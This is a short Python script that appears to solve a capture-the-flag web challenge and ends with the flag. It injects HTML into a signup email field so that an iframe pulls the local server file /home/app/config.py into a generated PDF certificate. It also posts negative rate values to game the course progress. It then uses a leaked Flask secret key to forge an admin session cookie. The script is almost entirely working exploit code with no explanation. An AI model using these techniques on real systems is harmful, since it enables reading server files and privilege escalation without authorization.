import requests


URL = 'http://onlineeducation.sstf.site/'

s = requests.Session()

s.post(URL + 'signin', data={'name': 'to', 'email': 'to@gm.com</b></span><br/><iframe src="file:///home/app/config.py" height="500" width="500"><span><b>'})
s.post(URL + 'status', json={'action': 'start'})
s.post(URL + 'status', json={'action': 'finish', 'rate': '-0.05'})

s.post(URL + 'status', json={'action': 'start'})
s.post(URL + 'status', json={'action': 'finish', 'rate': '-0.05'})

s.post(URL + 'status', json={'action': 'start'})
s.post(URL + 'status', json={'action': 'finish', 'rate': '-0.05'})

r = s.get(URL + 'cert')

with open('res.pdf', 'wb') as f:
    f.write(r.content)

from flask import Flask, session
app = Flask(__name__)
app.secret_key = "19eb794c831f30f099a31b1c095a17d6"

@app.route('/')
def index():
    session['is_admin'] = 1
    session['name'] = "to"
    return "cc"
app.run(host='0.0.0.0', port=1234, debug=False)

# SCTF{oh_I_forgot_to_disable_javascript}